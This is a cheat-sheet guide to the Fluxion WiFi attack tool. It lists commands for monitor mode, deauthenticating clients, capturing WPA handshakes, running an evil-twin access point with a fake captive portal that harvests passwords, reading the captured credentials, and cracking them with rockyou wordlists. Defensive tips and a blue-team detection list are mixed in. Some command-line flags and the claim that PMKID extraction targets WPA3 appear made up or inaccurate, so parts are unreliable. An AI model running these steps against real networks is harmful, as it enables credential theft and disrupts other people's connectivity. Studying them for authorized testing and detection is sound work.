Fluxion - Advanced WiFi Attack GUI

Fluxion is a graphical wireless penetration testing tool that automates WiFi attacks. Document its capabilities for authorized red team exercises and defensive awareness.

Installation

sudo git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo chmod +x fluxion.sh
sudo bash fluxion.sh

Defense: Monitor for cloning FluxionNetwork repositories and execution of fluxion.sh scripts.

Launch Fluxion Interface

sudo ./fluxion.sh

Launches interactive menu-driven WiFi attack interface with visual feedback.

Select Wireless Interface

sudo ifconfig

Identify available network interfaces before launching Fluxion. Choose adapter with strong injection support.

Enable Monitor Mode

sudo airmon-ng start wlan0
sudo ip link set wlan0mon up

Fluxion requires monitor mode. Defenders should detect monitor mode activation as potential threat indicator.

Network Scanning Phase

sudo airodump-ng --output-format csv -w /tmp/fluxion-scan wlan0mon
cat /tmp/fluxion-scan-01.csv

Scan and list all available WiFi networks. Fluxion automates this for target selection.

Select Target Network

Fluxion workflow:

1. Choose "Scan for networks"
2. Select target SSID from list
3. Select channel number
4. Proceed to attack selection

Always verify authorization before targeting any network.

Handshake Capture Method

sudo airodump-ng -c CHANNEL -b BSSID -w /tmp/fluxion-hs wlan0mon
sudo aireplay-ng --deauth 5 -a BSSID wlan0mon

Fluxion automates WPA/WPA2 handshake capture with optional deauth acceleration.

Evil Twin (Rogue AP) Mode

sudo hostapd -B /etc/hostapd/hostapd.conf
sudo dnsmasq -c /etc/dnsmasq.conf
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

Red Team: Create identical fake access point with superior signal.

Blue Team Defense: Educate users on network selection; implement 802.11i on all networks.

Captive Portal Creation

sudo fluxion --portal-auto-setup
# Fluxion generates fake login page

Fluxion auto-creates convincing login portal to capture credentials. Users redirected to portal on connection.

Credential Harvesting

cat /tmp/fluxion-credentials.txt
# Captured usernames and passwords stored

Defense: Teach users to verify certificate authenticity and avoid clicking "Accept" on suspicious portals.

Wordlist Dictionary Attack Mode

sudo fluxion --attack-type wordlist
# Select wordlist: /usr/share/wordlists/rockyou.txt
# Select captured handshake file

Automates hashcat/aircrack-ng integration for password cracking after handshake capture.

WPA/WPA2 Bruteforce Attack

sudo aircrack-ng -b BSSID -w /usr/share/wordlists/rockyou.txt /tmp/fluxion-hs-01.cap

Offline bruteforce attempt on captured handshake. Defenders: Enforce 16+ character passwords with complexity.

Network Monitor/Sniffer Mode

sudo tcpdump -i wlan0mon -w /tmp/traffic-capture.pcap 'not (arp or icmp)'
sudo wireshark /tmp/traffic-capture.pcap

Fluxion can capture network traffic to analyze unencrypted communications.

PMKID Extraction (WPA3 Networks)

sudo hcxdumptool -i wlan0mon --active_beacon -o /tmp/pmkid.pcap
# Fluxion auto-processes for hashcat attack

Modern method targeting even WPA3 networks. Defense: WPA3 brute force significantly slower than WPA2.

Log Export and Analysis

sudo ls -la /tmp/fluxion*/
sudo cat /tmp/fluxion-*/logs/*

Fluxion stores captured data, credentials, and logs in temp directories. Clean up after testing.

Cleanup and Restore

sudo airmon-ng stop wlan0mon
sudo systemctl restart networking
sudo killall hostapd dnsmasq
sudo iptables -t nat -F

Restore normal operations after test completion.

Blue Team: Detection Strategy

Network-Based Detection:

  • Alert on SSID cloning or duplicate network names with stronger signal
  • Monitor for suspicious captive portal redirects (HTTP instead of HTTPS)
  • Detect certificate mismatch warnings in browser traffic
  • Identify mass client deauthentication events
  • Log all failed WPA/WPA2 authentication attempts

Host-Based Detection:

  • Monitor for airodump-ng, airmon-ng, hostapd processes
  • Alert on monitor mode interface creation
  • Track tcpdump or packet capture tool execution
  • Flag DNS redirection or unknown DHCP servers
